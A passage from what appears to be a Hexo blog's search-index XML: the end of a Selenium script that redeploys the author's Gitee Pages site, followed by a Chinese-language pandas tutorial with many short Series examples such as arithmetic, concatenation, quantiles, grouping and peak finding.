class="comment"># 填入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pagesUrl = <span class="string">&quot;https://gitee.com/z3p5/z3p5/pages&quot;</span></span><br><span class="line">    browser.get(pagesUrl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    update = browser.find_element_by_css_selector(<span class="string">&quot;.button.orange.redeploy-button.ui.update_deploy&quot;</span>)</span><br><span class="line">    browser.execute_script(<span class="string">&quot;arguments[0].click();&quot;</span>,update)</span><br><span class="line">    alert = browser.switch_to.alert</span><br><span class="line">    alert.accept()</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    browser.quit()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    hexo()</span><br><span class="line">    gitee()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>开发</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>pandas基础学习</title>
    <url>/2021/01/14/pandas%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<script type="text/javascript" src="/z3p5/js/bai.js"></script>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>pandas和numpy关系紧密，很多方法要依托于np</p>
<h2 id="pandas的两种数据结构"><a href="#pandas的两种数据结构" class="headerlink" title="pandas的两种数据结构"></a>pandas的两种数据结构</h2><h3 id="series"><a href="#series" class="headerlink" title="series"></a>series</h3><p>一维数据结构</p>
<p>每一个元素都带有一个索引，与一维数组的含义相似，其中索引可以为数字或字符串</p>
<p>series结构名称：|索引列|数据列|</p>
<h4 id="构造series，举个栗子："><a href="#构造series，举个栗子：" class="headerlink" title="构造series，举个栗子："></a>构造series，举个栗子：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">mylist = <span class="built_in">list</span>(<span class="string">&#x27;abcedfghijklmnopqrstuvwxyz&#x27;</span>)   <span class="comment"># 列表</span></span><br><span class="line">myarr = np.arange(<span class="number">26</span>)	                      <span class="comment"># 数组</span></span><br><span class="line">mydict = <span class="built_in">dict</span>(<span class="built_in">zip</span>(mylist, myarr))             <span class="comment"># 字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建方法</span></span><br><span class="line">ser1 = pd.Series(mylist)</span><br><span class="line">ser2 = pd.Series(myarr)</span><br><span class="line">ser3 = pd.Series(mydict)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># head方法打印前3个数据</span></span><br><span class="line"><span class="built_in">print</span>(ser1.head(<span class="number">3</span>)) </span><br><span class="line"><span class="built_in">print</span>(ser2.head(<span class="number">3</span>)) <span class="comment"># 数字自动补充索引</span></span><br><span class="line"><span class="built_in">print</span>(ser3.head(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<h4 id="命名索引列的名称"><a href="#命名索引列的名称" class="headerlink" title="命名索引列的名称"></a>命名索引列的名称</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series(<span class="built_in">list</span>(<span class="string">&#x27;abcedfghijklmnopqrstuvwxyz&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命名索引列名称</span></span><br><span class="line">ser.name = <span class="string">&#x27;alphabets&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ser.head(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<h4 id="对series进行算术运算操作"><a href="#对series进行算术运算操作" class="headerlink" title="对series进行算术运算操作"></a>对series进行算术运算操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># series是基于索引进行算数运算操作的，pandas会根据索引对数据进行运算，若series之间有不同的索引，对应的值就为Nan。</span></span><br><span class="line">ser1 = pd.Series([<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>],[<span class="string">&#x27;index1&#x27;</span>,<span class="string">&#x27;index2&#x27;</span>,<span class="string">&#x27;index3&#x27;</span>,<span class="string">&#x27;index4&#x27;</span>])</span><br><span class="line">ser2 = pd.Series([<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>],[<span class="string">&#x27;index1&#x27;</span>,<span class="string">&#x27;index2&#x27;</span>,<span class="string">&#x27;index33&#x27;</span>,<span class="string">&#x27;index44&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加法</span></span><br><span class="line">ser_add = ser1 + ser2</span><br><span class="line"><span class="built_in">print</span>(ser_add)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 减法</span></span><br><span class="line">ser_minus = ser1 - ser2</span><br><span class="line"><span class="built_in">print</span>(ser_minus)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 乘法</span></span><br><span class="line">ser_multi = ser1 * ser2</span><br><span class="line"><span class="built_in">print</span>(ser_multi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 除法</span></span><br><span class="line">ser_div = ser1 / ser2 </span><br><span class="line"><span class="built_in">print</span>(ser_div)</span><br></pre></td></tr></table></figure>

<h4 id="series的索引转化为dataframe的列"><a href="#series的索引转化为dataframe的列" class="headerlink" title="series的索引转化为dataframe的列"></a>series的索引转化为dataframe的列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">mylist = <span class="built_in">list</span>(<span class="string">&#x27;abcedfghijklmnopqrstuvwxyz&#x27;</span>)   </span><br><span class="line">myarr = np.arange(<span class="number">26</span>)	                     </span><br><span class="line">mydict = <span class="built_in">dict</span>(<span class="built_in">zip</span>(mylist, myarr))            </span><br><span class="line"></span><br><span class="line">ser = pd.Series(mydict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># series转换为dataframe</span></span><br><span class="line">df = ser.to_frame()</span><br><span class="line"><span class="comment"># 索引列转换为dataframe的列</span></span><br><span class="line"></span><br><span class="line">df.reset_index(inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(df.head())</span><br></pre></td></tr></table></figure>

<h4 id="结合多个series组成dataframe"><a href="#结合多个series组成dataframe" class="headerlink" title="结合多个series组成dataframe"></a>结合多个series组成dataframe</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建series1</span></span><br><span class="line">ser1 = pd.Series(<span class="built_in">list</span>(<span class="string">&#x27;abcedfghijklmnopqrstuvwxyz&#x27;</span>)) </span><br><span class="line"><span class="comment"># 构建series2</span></span><br><span class="line">ser2 = pd.Series(np.arange(<span class="number">26</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1，axis=1表示列拼接，0表示行拼接</span></span><br><span class="line">df1 = pd.concat([ser1, ser2], axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(df1.head(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2，可以设置列名</span></span><br><span class="line">df2 = pd.DataFrame(&#123;<span class="string">&#x27;col1&#x27;</span>:ser1,<span class="string">&#x27;col2&#x27;</span>:ser2&#125;)</span><br><span class="line"><span class="built_in">print</span>(df2.head(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<h4 id="获得seriesA和seriesB不同的项"><a href="#获得seriesA和seriesB不同的项" class="headerlink" title="获得seriesA和seriesB不同的项"></a>获得seriesA和seriesB不同的项</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser1 = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">ser2 = pd.Series([<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求ser1和ser2的并集</span></span><br><span class="line">ser_u = pd.Series(np.union1d(ser1, ser2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求ser1和ser2的交集</span></span><br><span class="line">ser_i = pd.Series(np.intersect1d(ser1, ser2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求ser1和ser2不同的项其实就是求ser_i在ser_u的补集</span></span><br><span class="line">ser_b = ser_u[~ser_u.isin(ser_i)] <span class="comment"># isin返回布尔值,波浪号可以让布尔值取反（和为-1）</span></span><br><span class="line"><span class="built_in">print</span>(ser_b)</span><br></pre></td></tr></table></figure>

<h4 id="获得数值series的四分位值"><a href="#获得数值series的四分位值" class="headerlink" title="获得数值series的四分位值"></a>获得数值series的四分位值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置随机数种子</span></span><br><span class="line">state = np.random.RandomState(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从均值为10标准差为5的正态分布随机抽取25个点构成series</span></span><br><span class="line">ser = pd.Series(state.normal(<span class="number">10</span>, <span class="number">5</span>, <span class="number">25</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求ser的四分位数</span></span><br><span class="line">four = np.percentile(ser, q=[<span class="number">0</span>, <span class="number">25</span>, <span class="number">50</span>, <span class="number">75</span>, <span class="number">100</span>])</span><br><span class="line"><span class="built_in">print</span>(four)</span><br></pre></td></tr></table></figure>

<h4 id="获得series中单一项的频率计数"><a href="#获得series中单一项的频率计数" class="headerlink" title="获得series中单一项的频率计数"></a>获得series中单一项的频率计数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">#从0~7随机抽取30个列表值，组成series</span></span><br><span class="line">ser = pd.Series(np.take(<span class="built_in">list</span>(<span class="string">&#x27;abcdefgh&#x27;</span>), np.random.randint(<span class="number">8</span>, size=<span class="number">30</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对该series进行计数</span></span><br><span class="line">ser_c = ser.value_counts()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ser_c)</span><br></pre></td></tr></table></figure>

<h4 id="保留series中前两个频次最多的项，其他项替换为’other’"><a href="#保留series中前两个频次最多的项，其他项替换为’other’" class="headerlink" title="保留series中前两个频次最多的项，其他项替换为’other’"></a>保留series中前两个频次最多的项，其他项替换为’other’</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从1~4均匀采样12个点组成series</span></span><br><span class="line">ser = pd.Series(np.random.randint(<span class="number">1</span>, <span class="number">5</span>, [<span class="number">12</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照频率排序，除前两行索引对应的值不变，后几行索引对应的值为Other</span></span><br><span class="line">ser[~ser.isin(ser.value_counts().index[:<span class="number">2</span>])] = <span class="string">&#x27;Other&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ser)</span><br></pre></td></tr></table></figure>

<h4 id="对数值series分成10个相同数目的组（对数值series离散化成10个类别（categorical）值）"><a href="#对数值series分成10个相同数目的组（对数值series离散化成10个类别（categorical）值）" class="headerlink" title="对数值series分成10个相同数目的组（对数值series离散化成10个类别（categorical）值）"></a>对数值series分成10个相同数目的组（对数值series离散化成10个类别（categorical）值）</h4><p>通俗的说，就是不改变数据相对大小的条件下，对数据进行相应的缩小。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series(np.random.random(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 离散化10个类别值</span></span><br><span class="line">ser_n = pd.qcut(ser, q=[<span class="number">0</span>, <span class="number">.1</span>, <span class="number">.2</span>, <span class="number">.3</span>, <span class="number">.4</span>, <span class="number">.5</span>, <span class="number">.6</span>, <span class="number">.7</span>, <span class="number">.8</span>, <span class="number">.9</span>, <span class="number">1</span>], </span><br><span class="line">        labels=[<span class="string">&#x27;1st&#x27;</span>, <span class="string">&#x27;2nd&#x27;</span>, <span class="string">&#x27;3rd&#x27;</span>, <span class="string">&#x27;4th&#x27;</span>, <span class="string">&#x27;5th&#x27;</span>, <span class="string">&#x27;6th&#x27;</span>, <span class="string">&#x27;7th&#x27;</span>, <span class="string">&#x27;8th&#x27;</span>, <span class="string">&#x27;9th&#x27;</span>, <span class="string">&#x27;10th&#x27;</span>])</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(ser_n)</span><br></pre></td></tr></table></figure>

<h4 id="使numpy数组转化为给定形状的dataframe"><a href="#使numpy数组转化为给定形状的dataframe" class="headerlink" title="使numpy数组转化为给定形状的dataframe"></a>使numpy数组转化为给定形状的dataframe</h4><p>pandas数据重塑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series(np.random.randint(<span class="number">1</span>, <span class="number">10</span>, <span class="number">35</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># serier类型转换numpy类型，然后重构   </span></span><br><span class="line">df = pd.DataFrame(ser.values.reshape(<span class="number">7</span>,<span class="number">5</span>)) <span class="comment"># 7行5列</span></span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

<h4 id="找到series的值是3的倍数的位置"><a href="#找到series的值是3的倍数的位置" class="headerlink" title="找到series的值是3的倍数的位置"></a>找到series的值是3的倍数的位置</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series(np.random.randint(<span class="number">1</span>, <span class="number">10</span>, <span class="number">7</span>))</span><br><span class="line"><span class="built_in">print</span>(ser)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取值是3倍数的索引</span></span><br><span class="line">w = np.argwhere(ser.values % <span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(w)</span><br></pre></td></tr></table></figure>

<h4 id="获取series中给定索引的元素（items）"><a href="#获取series中给定索引的元素（items）" class="headerlink" title="获取series中给定索引的元素（items）"></a>获取series中给定索引的元素（items）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series(<span class="built_in">list</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>))</span><br><span class="line">index = [<span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定索引的元素</span></span><br><span class="line">t = ser.take(index)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>

<h4 id="垂直和水平的拼接series"><a href="#垂直和水平的拼接series" class="headerlink" title="垂直和水平的拼接series"></a>垂直和水平的拼接series</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser1 = pd.Series(<span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line">ser2 = pd.Series(<span class="built_in">list</span>(<span class="string">&#x27;abcde&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 垂直拼接</span></span><br><span class="line">ser_chui = pd.concat([ser1, ser2], axis=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(ser_chui)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 水平拼接</span></span><br><span class="line">df_shui = pd.concat([ser1, ser2], axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(df_shui)</span><br></pre></td></tr></table></figure>

<h4 id="获取series对象A中包含series对象B元素的位置"><a href="#获取series对象A中包含series对象B元素的位置" class="headerlink" title="获取series对象A中包含series对象B元素的位置"></a>获取series对象A中包含series对象B元素的位置</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser1 = pd.Series([<span class="number">10</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">13</span>])</span><br><span class="line">ser2 = pd.Series([<span class="number">1</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">13</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 1</span></span><br><span class="line">ser_n1 = [np.where(i == ser1)[<span class="number">0</span>].tolist()[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> ser2]</span><br><span class="line"><span class="built_in">print</span>(ser_n1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 2</span></span><br><span class="line">ser_n2 = [pd.Index(ser1).get_loc(i) <span class="keyword">for</span> i <span class="keyword">in</span> ser2]</span><br><span class="line"><span class="built_in">print</span>(ser_n2)</span><br></pre></td></tr></table></figure>

<h4 id="计算series之间的均方差"><a href="#计算series之间的均方差" class="headerlink" title="计算series之间的均方差"></a>计算series之间的均方差</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">truth = pd.Series(<span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line">pred = pd.Series(<span class="built_in">range</span>(<span class="number">10</span>)) + np.random.random(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 均方差</span></span><br><span class="line">r = np.mean((truth-pred)**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<h4 id="使series中每个元素的首字母为大写"><a href="#使series中每个元素的首字母为大写" class="headerlink" title="使series中每个元素的首字母为大写"></a>使series中每个元素的首字母为大写</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># series的元素为str类型</span></span><br><span class="line">ser = pd.Series([<span class="string">&#x27;how&#x27;</span>, <span class="string">&#x27;to&#x27;</span>, <span class="string">&#x27;kick&#x27;</span>, <span class="string">&#x27;ass?&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 1</span></span><br><span class="line">ser_r1 = ser.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.title())</span><br><span class="line"><span class="built_in">print</span>(ser_r1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 2 ，字符串相加</span></span><br><span class="line">ser_r2 = ser.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x[<span class="number">0</span>].upper() + x[<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(ser_r2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 3</span></span><br><span class="line">ser_r3 = pd.Series([i.title() <span class="keyword">for</span> i <span class="keyword">in</span> ser])</span><br><span class="line"><span class="built_in">print</span>(ser_r3)</span><br></pre></td></tr></table></figure>

<h4 id="计算series中每个元素的字符串长度"><a href="#计算series中每个元素的字符串长度" class="headerlink" title="计算series中每个元素的字符串长度"></a>计算series中每个元素的字符串长度</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series([<span class="string">&#x27;how&#x27;</span>, <span class="string">&#x27;to&#x27;</span>, <span class="string">&#x27;kick&#x27;</span>, <span class="string">&#x27;ass?&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r = ser.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<h4 id="计算series的一阶导和二阶导"><a href="#计算series的一阶导和二阶导" class="headerlink" title="计算series的一阶导和二阶导"></a>计算series的一阶导和二阶导</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series([<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">35</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求一阶导并转化为列表类型</span></span><br><span class="line"><span class="built_in">print</span>(ser.diff().tolist())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求二阶导并转化为列表类型</span></span><br><span class="line"><span class="built_in">print</span>(ser.diff().diff().tolist())</span><br></pre></td></tr></table></figure>

<h4 id="将一系列日期字符串转换为timeseries"><a href="#将一系列日期字符串转换为timeseries" class="headerlink" title="将一系列日期字符串转换为timeseries"></a>将一系列日期字符串转换为timeseries</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series([<span class="string">&#x27;01 Jan 2010&#x27;</span>, <span class="string">&#x27;02-02-2011&#x27;</span>, <span class="string">&#x27;20120303&#x27;</span>, <span class="string">&#x27;2013/04/04&#x27;</span>, <span class="string">&#x27;2014-05-05&#x27;</span>, <span class="string">&#x27;2015-06-06T12:20&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># panda一些牛逼克拉斯的方法 </span></span><br><span class="line">r = pd.to_datetime(ser)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<h4 id="从一个series中获取至少包含两个元音的元素"><a href="#从一个series中获取至少包含两个元音的元素" class="headerlink" title="从一个series中获取至少包含两个元音的元素"></a>从一个series中获取至少包含两个元音的元素</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="comment"># Counter是一个类字典类型，键是元素值，值是元素出现的次数,满足条件的元素返回True</span></span><br><span class="line"></span><br><span class="line">ser = pd.Series([<span class="string">&#x27;Apple&#x27;</span>, <span class="string">&#x27;Orange&#x27;</span>, <span class="string">&#x27;Plan&#x27;</span>, <span class="string">&#x27;Python&#x27;</span>, <span class="string">&#x27;Money&#x27;</span>])</span><br><span class="line"></span><br><span class="line">mask = ser.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">sum</span>([Counter(x.lower()).get(i, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="string">&#x27;aeiou&#x27;</span>)]) &gt;= <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">r = ser[mask]</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<h4 id="计算根据另一个series分组后的series均值"><a href="#计算根据另一个series分组后的series均值" class="headerlink" title="计算根据另一个series分组后的series均值"></a>计算根据另一个series分组后的series均值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">fruit = pd.Series(np.random.choice([<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;carrot&#x27;</span>], <span class="number">10</span>))</span><br><span class="line">weights = pd.Series(np.linspace(<span class="number">1</span>, <span class="number">10</span>, <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据fruit对weight分组</span></span><br><span class="line">weightsGrouped = weights.groupby(fruit)</span><br><span class="line"><span class="built_in">print</span>(weightsGrouped.indices)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对分组后series求每个索引的平均值</span></span><br><span class="line"><span class="built_in">print</span>(weightsGrouped.mean())</span><br></pre></td></tr></table></figure>

<h4 id="计算两个series之间的欧氏距离"><a href="#计算两个series之间的欧氏距离" class="headerlink" title="计算两个series之间的欧氏距离"></a>计算两个series之间的欧氏距离</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">p = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>])</span><br><span class="line">q = pd.Series([<span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1</span></span><br><span class="line">f1 = <span class="built_in">sum</span>((p - q)**<span class="number">2</span>)**<span class="number">.5</span></span><br><span class="line"><span class="built_in">print</span>(f1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2</span></span><br><span class="line">f2 = np.linalg.norm(p-q)</span><br><span class="line"><span class="built_in">print</span>(f2)</span><br></pre></td></tr></table></figure>

<h4 id="在数值series中找局部最大值"><a href="#在数值series中找局部最大值" class="headerlink" title="在数值series中找局部最大值"></a>在数值series中找局部最大值</h4><p>局部最大值对应二阶导局部最小值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">ser = pd.Series([<span class="number">2</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二阶导</span></span><br><span class="line">dd = np.diff(np.sign(np.diff(ser)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二阶导的最小值对应的值为最大值，返回最大值的索引</span></span><br><span class="line">peak_locs = np.where(dd == -<span class="number">2</span>)[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(peak_locs)</span><br></pre></td></tr></table></figure>

